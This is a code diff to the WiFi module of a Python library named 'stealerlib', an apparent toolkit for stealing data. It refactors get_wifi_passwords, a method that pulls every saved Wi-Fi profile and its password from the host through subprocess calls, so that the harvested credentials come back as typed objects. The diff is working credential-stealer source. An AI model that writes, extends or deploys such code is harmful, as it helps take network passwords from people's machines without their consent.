@@ -7,7 +7,11 @@
 
 import subprocess
 
+from dataclasses import dataclass
+
 from stealerlib.exceptions import catch
+
+from stealerlib.wifi.types import WiFiTypes
 
 
 class WiFi:
@@ -69,11 +73,12 @@ class WiFi:
         return info
 
     @catch
-    def get_wifi_passwords(self):
+    def get_wifi_passwords(self, conv: bool=True) -> list[WiFiTypes.SSID]:
         """Gets all wifi profiles and their passwords from the system
 
         Parameters:
             self (object): The object passed to the method
+            conv (bool): Whether to return the data as a list of information or a StealerLib object
 
         Returns:
             None
@@ -102,13 +107,18 @@ class WiFi:
                 ]
 
                 try:
-                    wifi_cred = profile_info[0]
+                    password = profile_info[0]
                 except IndexError:
-                    wifi_cred = "No Password"
+                    password = "No Password"
             except subprocess.CalledProcessError:
-                wifi_cred = "Encoding Error"
+                password = "Encoding Error"
 
-            self.ssids.append(profile)
-            self.passwords.append(wifi_cred)
-            self.credentials.append((profile, wifi_cred))
+            obj_ssid = WiFiTypes.SSID(profile, password)
 
+            self.ssids.append(obj_ssid.profile)
+            self.passwords.append(obj_ssid.password)
+            self.credentials.append(
+                obj_ssid.conv() if conv else obj_ssid
+            )
+
+        return self.credentials
